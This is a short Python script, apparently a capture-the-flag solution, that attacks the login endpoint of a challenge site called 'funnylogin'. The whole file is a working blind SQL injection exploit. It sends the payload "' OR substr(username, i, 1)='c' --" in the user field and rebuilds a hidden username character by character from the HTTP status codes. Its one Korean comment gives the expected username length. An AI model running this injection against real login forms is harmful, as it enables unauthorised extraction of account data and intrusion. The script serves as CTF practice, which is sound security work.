import requests
import string

url = "https://funnylogin.mc.ax/api/login"


def find_username():
    username = ""
    for i in range(1, 42):  # UUID는 36글자, 'user-'는 5글자로 총 41글자입니다.
        for c in string.ascii_lowercase + string.digits + "-":
            data = {
                "user": f"' OR substr(username, {i}, 1)='{c}' --",
                "pass": "any_password",
            }
            response = requests.post(url, data=data)
            print(i, c, response.text)
            if response.status_code == 200:
                username += c
                break
    print(f"Username: {username}")


find_username()
